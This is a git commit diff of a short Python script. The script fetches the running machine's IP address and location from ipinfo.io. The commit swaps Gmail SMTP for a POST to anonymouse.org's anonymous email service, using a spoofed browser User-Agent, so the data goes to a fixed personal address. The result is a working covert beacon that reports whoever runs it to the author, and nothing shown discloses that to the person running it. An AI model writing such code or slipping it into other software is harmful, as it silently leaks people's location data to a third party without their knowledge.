9fe8c260877aaebe6962b272664e893514b55f14
gowtham758550 <63159252+gowtham758550@users.noreply.github.com>
2020-04-05 22:12:10 +0530

    Update main.py

--- main.py
+++ main.py
@@ -6,15 +6,29 @@ import requests
 data = requests.get("https://ipinfo.io")
 msg = data.text
 
-sender = "python3testing755@gmail.com"
-password = 
-reciever = "gowtham758550@gmail.com"
+import requests
 
-server = smtplib.SMTP('smtp.gmail.com',587)
-server.starttls()
-server.login(sender,password)
 
-server.sendmail(sender,reciever,msg)
+to = 'gowtham758550@gmail.com'
+subject = 'check it'
+message = msg
 
+user_agent = 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
+sess = requests.Session()
+email_req = sess.post('http://anonymouse.org/cgi-bin/anon-email.cgi', headers={
+	'Host': 'anonymouse.org',
+	'User-Agent': user_agent,
+	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+	'Accept-Language': 'en-US,en;q=0.5',
+	'Accept-Encoding': 'gzip, deflate',
+	'Referer': 'http://anonymouse.org/anonemail.html',
+        'Connection': 'close',
+        'Upgrade-Insecure-Requests':'1',
+        'Content-Type':'application/x-www-form-urlencoded'
+}, data={
+	'to': to,
+	'subject': subject,
+	'text': message
+})
 
 
